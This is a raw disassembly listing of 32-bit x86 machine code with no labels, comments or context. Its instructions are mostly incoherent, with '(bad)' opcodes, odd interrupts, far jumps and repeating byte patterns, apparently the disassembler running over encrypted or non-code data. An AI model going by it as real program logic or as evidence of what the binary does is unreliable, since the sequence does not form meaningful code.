  422bb7:	or     eax,0x808169bd
  422bbc:	adc    dh,0x14
  422bbf:	int    0x76
  422bc1:	mov    ebp,0xd30de6cd
  422bc6:	lods   eax,DWORD PTR ds:[esi]
  422bc7:	xchg   DWORD PTR [ebx],esi
  422bc9:	retf   
  422bca:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422bd1:	in     al,dx
  422bd2:	push   esi
  422bd3:	int    0xc6
  422bd5:	or     eax,0xbd92c704
  422bda:	daa    
  422bdb:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422be5:	or     eax,0xc087add3
  422bea:	mov    BYTE PTR [esi-0x30577740],bl
  422bf0:	gs jp  0x422b77
  422bf3:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422bfd:	xchg   esi,esp
  422bff:	or     eax,0x699e30c0
  422c04:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422c0b:	xor    ebp,DWORD PTR [ebp+0x6c]
  422c0e:	int    0x10
  422c10:	mov    ebp,0x808081bc
  422c15:	int    0x7d
  422c17:	xor    ecx,DWORD PTR [edi]
  422c19:	xor    ah,0x81
  422c1c:	lea    esi,[ebp-0x7b8a19fc]
  422c22:	das    
  422c23:	add    al,0xd0
  422c25:	add    BYTE PTR [eax+0x75760480],0x8b
  422c2c:	int    0x8d
  422c2e:	mov    ch,0x4
  422c30:	cli    
  422c31:	test   BYTE PTR [edx-0x61783f79],al
  422c37:	int    0xe6
  422c39:	jge    0x422c0e
  422c3b:	xacquire xchg BYTE PTR [ebx],dh
  422c3e:	ins    DWORD PTR es:[edi],dx
  422c3f:	ins    BYTE PTR es:[edi],dx
  422c40:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422c45:	outs   dx,DWORD PTR ds:[esi]
  422c46:	lods   al,BYTE PTR ds:[esi]
  422c47:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422c4d:	inc    esp
  422c4e:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c58:	lea    edi,[ebp+0x4a58d0a]
  422c5e:	cli    
  422c5f:	test   BYTE PTR [edx+0x402cd77],al
  422c65:	mov    dh,0xa5
  422c67:	and    ebx,0xa58d04ef
  422c6d:	xchg   edx,eax
  422c6e:	mov    es,WORD PTR [edx+edi*8]
  422c71:	dec    esi
  422c72:	ja     0x422c92
  422c74:	pop    ebp
  422c75:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c7b:	int    0xf
  422c7d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c83:	jecxz  0x422c32
  422c85:	xchg   DWORD PTR [esi+0x7d],esi
  422c88:	or     dh,BYTE PTR [esi+0xd]
  422c8b:	in     al,dx
  422c8c:	inc    esi
  422c8d:	add    al,0xef
  422c8f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c95:	jecxz  0x422c83
  422c97:	jecxz  0x422c4f
  422c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c9a:	pop    esi
  422c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c9c:	lods   eax,DWORD PTR ds:[esi]
  422c9d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422ca4:	lods   eax,DWORD PTR ds:[esi]
  422ca5:	mov    ss,esi
  422ca7:	mov    ebp,0x8086745d
  422cac:	add    BYTE PTR [edi+0x760a7d76],0xd
  422cb3:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422cb9:	test   al,0x33
  422cbb:	add    BYTE PTR [edx-0x33],bh
  422cbe:	leave  
  422cbf:	int    0xc6
  422cc1:	or     eax,0x808059bd
  422cc6:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cce:	jecxz  0x422cb9
  422cd0:	mov    ss,esi
  422cd2:	in     eax,dx
  422cd3:	in     al,dx
  422cd4:	add    BYTE PTR [eax],0x76
  422cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cd8:	int    0x8d
  422cda:	mov    ch,0x4
  422cdc:	rcl    DWORD PTR [edx-0x32021933],cl
  422ce2:	leave  
  422ce3:	xor    esi,DWORD PTR [esi+0x34]
  422ce6:	pop    esi
  422ce7:	jbe    0x422c8e
  422ce9:	jnp    0x422c75
  422ceb:	int    0xf8
  422ced:	xor    edx,esi
  422cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cf0:	int    0x96
  422cf2:	cmp    al,0x45
  422cf4:	inc    ecx
  422cf5:	inc    ebx
  422cf6:	add    esi,DWORD PTR [edi-0x79]
  422cf9:	jle    0x422cd1
  422cfb:	clc    
  422cfc:	or     ah,dh
  422cfe:	std    
  422cff:	das    
  422d00:	pop    ecx
  422d01:	adc    DWORD PTR [ebx-0x1a],eax
  422d04:	cmp    al,0x2f
  422d06:	or     esp,DWORD PTR [edx-0x2]
  422d09:	add    BYTE PTR [eax],al
  422d0b:	mov    ebp,0x80808040
  422d10:	xor    ebp,DWORD PTR [ebp-0x31]
  422d13:	les    esi,FWORD PTR [esp+eiz*2]
  422d16:	int    0x96
  422d18:	sub    al,0xcd
  422d1a:	(bad)  
  422d1b:	stc    
  422d1c:	xor    edx,esi
  422d1e:	sbb    al,0xa
  422d20:	inc    edx
  422d21:	int    0x96
  422d23:	inc    esp
  422d24:	int    0xe6
  422d26:	std    
  422d27:	xor    esp,esi
  422d29:	xor    al,0xa
  422d2b:	pusha  
  422d2c:	retf   
  422d2d:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422d33:	test   al,0x9c
  422d35:	xor    ebp,DWORD PTR [ebp+0x6c]
  422d38:	in     al,dx
  422d39:	popf   
  422d3a:	adc    bh,ah
  422d3c:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422d43:	shl    ebp,cl
  422d45:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422d4b:	(bad)  
  422d4c:	and    al,0x77
  422d4e:	mov    ch,0xcd
  422d50:	jbe    0x422cff
  422d52:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d58:	lods   eax,DWORD PTR ds:[esi]
  422d59:	or     dl,dh
  422d5b:	stc    
  422d5c:	test   al,0xc5
  422d5e:	int    0x8d
  422d60:	jne    0x422d91
  422d62:	pop    ecx
  422d63:	ins    DWORD PTR es:[edi],dx
  422d64:	shl    edx,cl
  422d66:	test   BYTE PTR [edi-0x2c78428a],al
  422d6c:	in     al,dx
  422d6d:	xchg   BYTE PTR [edi],ch
  422d6f:	pop    ecx
  422d70:	ins    DWORD PTR es:[edi],dx
  422d71:	xchg   DWORD PTR [esi+0x75],esi
  422d74:	int    0xc6
  422d76:	jge    0x422d47
  422d78:	les    esi,FWORD PTR [esi-0x80]
  422d7b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d7e:	les    esi,FWORD PTR [esi-0x80]
  422d81:	adc    bh,ah
  422d83:	add    BYTE PTR [eax+0x24778180],0xcd
  422d8a:	mov    WORD PTR [esp+ebx*2],?
  422d8d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d94:	xor    al,0xa4
  422d96:	ja     0x422dbd
  422d98:	retf   0x31
  422d9b:	je     0x422dd1
  422d9d:	pop    esp
  422d9e:	shl    ebp,cl
  422da0:	mov    BYTE PTR [ecx],cl
  422da2:	xchg   esp,eax
  422da3:	xor    al,0x2c
  422da5:	int    0xc
  422da7:	das    
  422da8:	mov    ebx,0xebd38096
  422dad:	push   ebx
  422dae:	das    
  422daf:	rcl    DWORD PTR [ebx],1
  422db1:	pop    esi
  422db2:	mov    WORD PTR [esp+ebp*1],?
  422db5:	ja     0x422dd1
  422db7:	int    0xdb
  422db9:	pop    edi
  422dba:	or     BYTE PTR [eax+0x13338080],0xd3
  422dc1:	jmp    0x422d48
  422dc3:	mov    eax,0x87808d81
  422dc8:	ins    DWORD PTR es:[edi],dx
  422dc9:	iret   
  422dca:	les    esi,FWORD PTR [esp+ebp*2]
  422dcd:	(bad)
  422dd0:	test   DWORD PTR [esi],edi
  422dd2:	mov    WORD PTR [esp+ebp*1],?
  422dd5:	xor    ebx,ebx
  422dd7:	mov    eax,0x8780963e
  422ddc:	ins    DWORD PTR es:[edi],dx
  422ddd:	add    al,0x6d
  422ddf:	or     edi,0xc56c34c4
  422de5:	cwde   
  422de6:	int    0xf0
  422de8:	mov    ebp,0xfcd9
  422ded:	int    0xd9
  422def:	int    0xf
  422df1:	jns    0x422d79
  422df3:	mov    bh,0xbd
  422df5:	sub    esp,edi
  422df7:	add    BYTE PTR [eax],al
  422df9:	cwde   
  422dfa:	int    0xf0
  422dfc:	jns    0x422e76
  422dfe:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422e04:	add    BYTE PTR [eax-0x58798787],bl
  422e0a:	mov    ebp,0xfc38
  422e0f:	jns    0x422e89
  422e11:	xchg   edx,eax
  422e12:	cmp    eax,0xeceb99cd
  422e17:	add    eax,DWORD PTR [eax]
  422e19:	add    BYTE PTR [esi-0x12ed1233],dl
  422e1f:	inc    esp
  422e20:	add    DWORD PTR [eax-0x6893680],0x35862149
  422e2a:	leave  
  422e2b:	jbe    0x422de2
  422e2d:	inc    ecx
  422e2e:	and    DWORD PTR [esi-0x778932cb],eax
  422e34:	or     dh,BYTE PTR [esi-0x78]
  422e37:	int    0x76
  422e39:	stc    
  422e3a:	int    0x96
  422e3c:	stc    
  422e3d:	pop    ebx
  422e3e:	cwde   
  422e3f:	call   0xd3e3:0x3b9effc0
  422e46:	jmp    0x3586:0x21d1bf28
  422e4d:	cmp    eax,ebp
  422e4f:	sar    DWORD PTR [ebp+0xad25392],cl
  422e55:	jbe    0x422ecc
  422e57:	int    0x76
  422e59:	stc    
  422e5a:	int    0x96
  422e5c:	stc    
  422e5d:	cmp    eax,ebp
  422e5f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e65:	jmp    0xfd76:0xad25328
  422e6c:	int    0x76
  422e6e:	stc    
  422e6f:	int    0x96
  422e71:	stc    
  422e72:	cmp    eax,ebp
  422e74:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e7a:	jmp    0xd076:0xad25328
  422e81:	int    0x76
  422e83:	stc    
  422e84:	int    0x96
  422e86:	stc    
  422e87:	cmp    eax,ebp
  422e89:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e8f:	jmp    0xbd76:0xad25328
  422e96:	leave  
  422e97:	jbe    0x422ec6
  422e99:	dec    ecx
  422e9a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422ea1:	mov    al,ds:0x76c93586
  422ea6:	and    eax,0x35862169
  422eab:	sar    BYTE PTR [esp+ebx*4],0xa
  422eaf:	jbe    0x422e81
  422eb1:	or     dh,BYTE PTR [esi-0x30]
  422eb4:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422ebc:	ror    cl,1
  422ebe:	jbe    0x422e90
  422ec0:	jo     0x422e42
  422ec2:	add    BYTE PTR [eax+0x78d076c9],0x80
  422ec9:	add    BYTE PTR [eax-0x32068933],0x96
  422ed0:	stc    
  422ed1:	cmp    eax,ebp
  422ed3:	cmp    esp,ebx
  422ed5:	sar    DWORD PTR [ebp+0x28ead392],cl
  422edb:	push   ebx
  422edc:	ror    BYTE PTR [edx],cl
  422ede:	jbe    0x422eb0
  422ee0:	int    0x76
  422ee2:	stc    
  422ee3:	int    0x96
  422ee5:	stc    
  422ee6:	cmp    eax,ebp
  422ee8:	cmp    esp,ebx
  422eea:	sar    DWORD PTR [ebp+0x28ead392],cl
  422ef0:	push   ebx
  422ef1:	ror    BYTE PTR [edx],cl
  422ef3:	jbe    0x422ec5
  422ef5:	leave  
  422ef6:	jbe    0x422e8d
  422ef8:	arpl   WORD PTR [edx+0x76c98080],dx
  422efe:	lods   eax,DWORD PTR ds:[esi]
  422eff:	pop    esi
  422f00:	add    BYTE PTR [eax+0xd76c980],0xe6
  422f07:	add    BYTE PTR [eax-0xa983080],0xff
  422f0e:	add    BYTE PTR [eax],al
  422f10:	iret   
  422f11:	push   edi
  422f12:	xchg   ebp,eax
  422f13:	inc    DWORD PTR [eax]
  422f15:	add    BYTE PTR [ebp+0xff13],bh
  422f1b:	add    BYTE PTR [ebp+0xf3d60d],cl
  422f21:	lea    ebp,[ebp-0x72ff562a]
  422f27:	xchg   ebp,eax
  422f28:	(bad)  
  422f29:	fcmove st,st(1)
  422f2b:	jbe    0x422eda
  422f2d:	dec    esi
  422f2e:	ins    BYTE PTR es:[edi],dx
  422f2f:	add    BYTE PTR [eax-0x32068933],0x8d
  422f36:	stc    
  422f37:	cmp    eax,ebp
  422f39:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422f3f:	cmp    ecx,DWORD PTR [edi]
  422f41:	shl    edx,cl
  422f43:	sub    BYTE PTR [ebx-0x2d],dl
  422f46:	or     dh,BYTE PTR [esi+0x6d]
  422f49:	int    0x76
  422f4b:	stc    
  422f4c:	int    0x8d
  422f4e:	stc    
  422f4f:	add    al,0xb6
  422f51:	cmc    
  422f52:	cmp    BYTE PTR [ebx],0xc5
  422f55:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f5b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f5f:	or     dh,BYTE PTR [esi-0x6b]
  422f62:	mov    ah,0xb1
  422f64:	sbb    al,0x80
  422f66:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f6d:	push   eax
  422f6e:	or     dh,BYTE PTR [esi-0x13]
  422f71:	int    0x6c
  422f73:	dec    esp
  422f74:	or     dh,BYTE PTR [esi+0x11]
  422f77:	int    0x76
  422f79:	mov    bh,cl
  422f7b:	(bad)  
  422f7c:	cmc    
  422f7d:	or     cl,BYTE PTR [ecx]
  422f7f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f85:	mov    bh,cl
  422f87:	(bad)  
  422f88:	in     eax,dx
  422f89:	or     cl,BYTE PTR [ecx]
  422f8b:	push   ebp
  422f8c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f96:	lea    edx,[ecx]
  422f98:	or     cl,BYTE PTR [ecx]
  422f9a:	pop    ebp
  422f9b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422fa5:	stc    
  422fa6:	int    0x96
  422fa8:	stc    
  422fa9:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422fac:	cdq    
  422fad:	shr    ebx,cl
  422faf:	xchg   edx,eax
  422fb0:	shr    edx,cl
  422fb2:	sub    BYTE PTR [ebx+0x13],dl
  422fb5:	inc    ebx
  422fb6:	jge    0x422fe7
  422fb8:	add    eax,0x808087ca
  422fbd:	int    0x76
  422fbf:	mov    ch,cl
  422fc1:	add    DWORD PTR ds:0xcd808081,esi
  422fc7:	mov    ch,cl
  422fc9:	jbe    0x422f53
  422fcb:	int    0x1
  422fcd:	xor    eax,0xcd808081
  422fd2:	add    BYTE PTR [edi-0x72329b92],0x88
  422fd9:	int    0xa
  422fdb:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422fe1:	adc    al,0x0
  422fe3:	add    BYTE PTR [eax],al
  422fe5:	(bad)  
  422fe6:	int    0x96
  422fe8:	mov    ch,cl
  422fea:	mov    ds:0x80808125,al
  422fef:	int    0x22
  422ff1:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422ff7:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422fff:	bound  eax,QWORD PTR [eax]
  423001:	jno    0x423027
  423003:	cmp    ebp,DWORD PTR [ebp-0x37]
  423006:	push   es
  423007:	push   esp
  423008:	add    BYTE PTR [eax],al
  42300a:	add    BYTE PTR [esi],cl
  42300c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42300d:	aad    0x49
  42300f:	leave  
  423010:	push   es
  423011:	pop    esp
  423012:	add    BYTE PTR [eax],al
  423014:	add    BYTE PTR [edi+0x35],dl
  423017:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  42301d:	add    BYTE PTR [eax],al
  42301f:	mov    ds:0x79d735c1,eax
  423024:	push   es
  423025:	ins    BYTE PTR es:[edi],dx
  423026:	add    BYTE PTR [eax],al
  423028:	add    BYTE PTR [eax],bl
  42302a:	iret   
  42302b:	outs   dx,BYTE PTR ds:[si]
  42302d:	add    BYTE PTR [eax],al
  42302f:	add    BYTE PTR [edi+0x3b41afb8],ch
  423035:	ins    DWORD PTR es:[edi],dx
  423036:	leave  
  423037:	push   es
  423038:	sub    al,0x0
  42303a:	add    BYTE PTR [eax],al
  42303c:	push   cs
  42303d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42303e:	aad    0x49
  423040:	leave  
  423041:	push   es
  423042:	xor    al,0x0
  423044:	add    BYTE PTR [eax],al
  423046:	push   edi
  423047:	xor    eax,0x6c9ab13
  42304c:	cmp    al,0x0
  42304e:	add    BYTE PTR [eax],al
  423050:	mov    ds:0x79c335c1,eax
  423055:	push   es
  423056:	inc    esp
  423057:	add    BYTE PTR [eax],al
  423059:	add    BYTE PTR [eax],bl
  42305b:	iret   
  42305c:	addr16 inc esi
  42305e:	add    BYTE PTR [eax],al
  423060:	add    BYTE PTR [edi-0x32be5048],ch
  423066:	jbe    0x422ff0
  423068:	int    0x1
  42306a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423070:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423077:	int    0x76
  423079:	mov    ch,cl
  42307b:	add    DWORD PTR [ebp-0x7f],edi
  42307e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423085:	mov    dl,0x35
  423087:	leave  
  423088:	jbe    0x42308f
  42308a:	mov    bh,0x3f
  42308c:	cmp    DWORD PTR [edi-0x48],eax
  42308f:	leave  
  423090:	jbe    0x42309b
  423092:	xlat   BYTE PTR ds:[ebx]
  423093:	sbb    cl,cl
  423095:	push   es
  423096:	les    eax,FWORD PTR [eax]
  423098:	add    BYTE PTR [eax],al
  42309a:	push   cs
  42309b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42309c:	aad    0x49
  42309e:	leave  
  42309f:	push   es
  4230a0:	nop
  4230a1:	add    BYTE PTR [eax],al
  4230a3:	add    BYTE PTR [edi+0x35],dl
  4230a6:	xlat   BYTE PTR ds:[ebx]
  4230a7:	inc    ecx
  4230a8:	leave  
  4230a9:	push   es
  4230aa:	aam    0x0
  4230ac:	add    BYTE PTR [eax],al
  4230ae:	cmp    DWORD PTR [ecx+0x57],ecx
  4230b1:	jge    0x42307c
  4230b3:	push   es
  4230b4:	fadd   QWORD PTR [eax]
  4230b6:	add    BYTE PTR [eax],al
  4230b8:	mov    cl,0x3f
  4230ba:	shl    DWORD PTR ds:0xe406c9,0x0
  4230c1:	add    BYTE PTR [edi-0x49],al
  4230c4:	xlat   BYTE PTR ds:[ebx]
  4230c5:	sbb    cl,cl
  4230c7:	push   es
  4230c8:	pushf  
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [esi],cl
  4230cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230ce:	aad    0x49
  4230d0:	leave  
  4230d1:	push   es
  4230d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230d3:	add    BYTE PTR [eax],al
  4230d5:	add    BYTE PTR [edi+0x35],dl
  4230d8:	xlat   BYTE PTR ds:[ebx]
  4230d9:	inc    ecx
  4230da:	leave  
  4230db:	push   es
  4230dc:	lods   al,BYTE PTR ds:[esi]
  4230dd:	add    BYTE PTR [eax],al
  4230df:	add    BYTE PTR [ecx],bh
  4230e1:	dec    ecx
  4230e2:	push   edi
  4230e3:	jge    0x4230ae
  4230e5:	push   es
  4230e6:	mov    ah,0x0
  4230e8:	add    BYTE PTR [eax],al
  4230ea:	mov    cl,0x3f
  4230ec:	shl    DWORD PTR ds:0xbc06c9,0x0
  4230f3:	add    BYTE PTR [edi-0x49],al
  4230f6:	ret    
  4230f7:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  4230fd:	jo     0x4230cc
  4230ff:	jbe    0x423136
  423101:	add    BYTE PTR [eax],dh
  423103:	int    0x76
  423105:	stc    
  423106:	int    0x8d
  423108:	stc    
  423109:	cmp    eax,ebp
  42310b:	cmp    ecx,DWORD PTR [edi]
  42310d:	shl    edx,cl
  42310f:	sub    bl,dl
  423111:	mov    ebp,0xcdd35392
  423116:	lea    ebp,[ebp+0x52fd343]
  42311c:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  423123:	int    0x8d
  423125:	mov    ch,0x3b
  423127:	lds    edi,FWORD PTR [ebx]
  423129:	psrlq  mm6,mm2
  42312c:	sub    bl,dl
  42312e:	mov    ebp,0xcdd35392
  423133:	lea    ebp,[ebp+0x76cd7d33]
  423139:	ins    DWORD PTR es:[edi],dx
  42313a:	inc    ebx
  42313b:	shr    DWORD PTR [edi],cl
  42313d:	or     ch,dl
  42313f:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  423149:	int    0x76
  42314b:	mov    ch,cl
  42314d:	rcl    BYTE PTR [ecx],1
  42314f:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423159:	add    DWORD PTR [ebp-0x7f],esi
  42315c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423163:	jo     0x423165
  423165:	cwde   
  423166:	xor    ch,cl
  423168:	lea    ecx,[eax-0x7ebaf533]
  42316e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423175:	int    0x5d
  423177:	adc    DWORD PTR [ecx-0x29327f80],eax
  42317d:	mov    BYTE PTR [ebx],bh
  42317f:	ins    DWORD PTR es:[edi],dx
  423180:	iret   
  423181:	pop    ss
  423182:	pushf  
  423183:	add    BYTE PTR [eax],al
  423185:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42318b:	jo     0x42315a
  42318d:	jbe    0x423117
  42318f:	int    0x1
  423191:	inc    ebp
  423192:	add    DWORD PTR [eax+0x500080],0x760a889a
  42319c:	adc    eax,0xcd8876cd
  4231a1:	pop    ebp
  4231a2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231a8:	mov    BYTE PTR [ebx],bh
  4231aa:	ins    DWORD PTR es:[edi],dx
  4231ab:	iret   
  4231ac:	pop    ss
  4231ad:	les    eax,FWORD PTR [eax]
  4231af:	add    BYTE PTR [eax],al
  4231b1:	mov    ebp,0x80803ad9
  4231b6:	jo     0x423185
  4231b8:	jbe    0x423142
  4231ba:	int    0x1
  4231bc:	inc    ebp
  4231bd:	add    DWORD PTR [eax+0x500080],0x76cd889a
  4231c7:	mov    ch,cl
  4231c9:	pop    ebp
  4231ca:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231d0:	mov    BYTE PTR [ebx],bh
  4231d2:	ins    DWORD PTR es:[edi],dx
  4231d3:	iret   
  4231d4:	pop    ss
  4231d5:	push   esp
  4231d6:	add    BYTE PTR [eax],al
  4231d8:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  4231de:	jo     0x4231ad
  4231e0:	jbe    0x42316a
  4231e2:	int    0x1
  4231e4:	inc    ebp
  4231e5:	add    DWORD PTR [eax+0x500080],0xb604889a
  4231ef:	pop    ebp
  4231f0:	or     BYTE PTR [edx],0x76
  4231f3:	xor    eax,0xc05d76cd
  4231f8:	push   ds
  4231f9:	cmp    ebx,edx
  4231fb:	sahf   
  4231fc:	clc    
  4231fd:	add    al,BYTE PTR [ecx]
  4231ff:	shr    BYTE PTR [esi+0x2f],cl
  423202:	pop    ecx
  423203:	shl    BYTE PTR [eax+0x0],cl
  423206:	xchg   esi,eax
  423207:	xor    eax,0x43d66d06
  42320c:	int    0x76
  42320e:	pop    ebp
  42320f:	add    al,0xad
  423211:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  423218:	adc    eax,0x40d46d06
  42321d:	int    0x76
  42321f:	mov    ch,cl
  423221:	pop    ebp
  423222:	adc    DWORD PTR [ecx-0x29327f80],eax
  423228:	mov    BYTE PTR [ebx],bh
  42322a:	ins    DWORD PTR es:[edi],dx
  42322b:	iret   
  42322c:	xchg   esi,eax
  42322d:	add    DWORD PTR [ebp-0x7f7fc560],edi
  423233:	jo     0x423202
  423235:	jbe    0x4231bf
  423237:	int    0x1
  423239:	cmp    eax,0x808081
  42323e:	push   eax
  42323f:	add    BYTE PTR [edx+0xd760a88],bl
  423245:	in     al,dx
  423246:	test   BYTE PTR [esi+esi*4],al
  423249:	or     eax,0x5d760080
  42324e:	add    al,0xe6
  423250:	pop    ebp
  423251:	sub    al,0x82
  423253:	sub    eax,0xcdb576cd
  423258:	lea    esi,[ebp-0x3f772933]
  42325e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423264:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42326a:	push   ebx
  42326b:	ror    edi,cl
  42326d:	pop    ss
  42326e:	cmc    
  42326f:	inc    DWORD PTR [eax]
  423271:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423277:	jo     0x423246
  423279:	jbe    0x423274
  42327b:	int    0x8d
  42327d:	stc    
  42327e:	int    0xd6
  423280:	mov    BYTE PTR [ebx],bh
  423282:	lds    edi,FWORD PTR [ebx]
  423284:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42328b:	push   ebx
  42328c:	ror    edi,cl
  42328e:	pop    ss
  42328f:	xchg   ebp,eax
  423290:	inc    DWORD PTR [eax]
  423292:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423298:	jo     0x42329a
  42329a:	xchg   esi,eax
  42329b:	or     eax,0xcdf98dcd
  4232a0:	xchg   esi,eax
  4232a1:	stc    
  4232a2:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4232a5:	(bad)  
  4232a7:	jmp    0x42323b
  4232a9:	shr    edx,cl
  4232ab:	sub    BYTE PTR [ebx+0x13],dl
  4232ae:	inc    ebx
  4232af:	jge    0x423287
  4232b1:	mov    ecx,ecx
  4232b3:	jbe    0x4232f2
  4232b5:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  4232bf:	cmp    eax,ebp
  4232c1:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  4232c7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4232cb:	xchg   DWORD PTR [esi+0x6d],esi
  4232ce:	or     dh,BYTE PTR [esi+0x6d]
  4232d1:	int    0x76
  4232d3:	cmp    eax,0x1cd46d06
  4232d8:	int    0x76
  4232da:	mov    ch,0xcd
  4232dc:	lea    esi,[ebp-0xfc43ac5]
  4232e2:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4232e8:	push   ebx
  4232e9:	rol    DWORD PTR [edi+0x760a9576],cl
  4232ef:	xchg   ebp,eax
  4232f0:	int    0x76
  4232f2:	mov    ch,0xcd
  4232f4:	lea    esi,[ebp-0xfc43ac5]
  4232fa:	shl    edx,cl
  4232fc:	sub    bl,dl
  4232fe:	mov    ebp,0xcdd35392
  423303:	lea    ebp,[ebp+0x76cd7d33]
  423309:	ins    DWORD PTR es:[edi],dx
  42330a:	inc    ebx
  42330b:	shr    DWORD PTR [edi],cl
  42330d:	pop    es
  42330e:	push   eax
  42330f:	inc    DWORD PTR [eax]
  423311:	add    al,al
  423313:	jmp    FWORD PTR [eax-0x326a8933]
  423319:	lea    ebp,[ebp+0x43]
  42331c:	jge    0x4232f4
  42331e:	xor    DWORD PTR [eax],eax
  423320:	(bad)  
  423321:	mov    bh,cl
  423323:	jbe    0x423322
  423325:	jo     0x4232e4
  423327:	stc    
  423328:	jl     0x4232aa
  42332a:	or     BYTE PTR [edx],0x76
  42332d:	jne    0x42331b
  42332f:	sbb    cl,ch
  423331:	jbe    0x4233a8
  423333:	int    0x8d
  423335:	mov    ch,0xcd
  423337:	xchg   esi,eax
  423338:	mov    ch,0x3b
  42333a:	or     al,0x3b
  42333c:	cdq    
  42333d:	shr    ebx,cl
  42333f:	xchg   edx,eax
  423340:	shr    edx,cl
  423342:	sub    BYTE PTR [ebx+0x13],dl
  423345:	push   ecx
  423346:	mov    ch,cl
  423348:	jbe    0x423343
  42334a:	int    0x8d
  42334c:	stc    
  42334d:	cmp    eax,ebp
  42334f:	cmp    ecx,DWORD PTR [edi]
  423351:	shl    edx,cl
  423353:	sub    bl,dl
  423355:	mov    ebp,0xcdd35392
  42335a:	lea    esi,[ebp+0x43]
  42335d:	shr    DWORD PTR [edi],cl
  42335f:	add    eax,0x80805300
  423364:	int    0x76
  423366:	stc    
  423367:	int    0x8d
  423369:	stc    
  42336a:	cmp    eax,ebp
  42336c:	cmp    ecx,DWORD PTR [edi]
  42336e:	shl    edx,cl
  423370:	sub    bl,dl
  423372:	mov    ebp,0xcdd35392
  423377:	(bad)  
  423378:	std    
  423379:	inc    ebx
  42337a:	shr    DWORD PTR [edi],cl
  42337c:	add    eax,0x808053ea
  423381:	int    0x76
  423383:	stc    
  423384:	int    0x8d
  423386:	stc    
  423387:	cmp    eax,ebp
  423389:	cmp    ecx,DWORD PTR [edi]
  42338b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423391:	push   ebx
  423392:	shr    esp,cl
  423394:	adc    al,0xcd
  423396:	lea    esi,[ebp+0x3bb596cd]
  42339c:	or     al,0x3b
  42339e:	cdq    
  42339f:	shr    ebx,cl
  4233a1:	xchg   edx,eax
  4233a2:	shr    edx,cl
  4233a4:	sub    BYTE PTR [ebx+0x13],dl
  4233a7:	xchg   ebx,edx
  4233a9:	int    0x8d
  4233ab:	std    
  4233ac:	inc    ebx
  4233ad:	rol    DWORD PTR [edx-0x2893219],cl
  4233b3:	or     dh,BYTE PTR [esi-0x53]
  4233b6:	int    0x76
  4233b8:	jne    0x4233c4
  4233ba:	jbe    0x42338c
  4233bc:	ret    
  4233bd:	dec    ecx
  4233be:	and    DWORD PTR [esi+0x45e60a35],eax
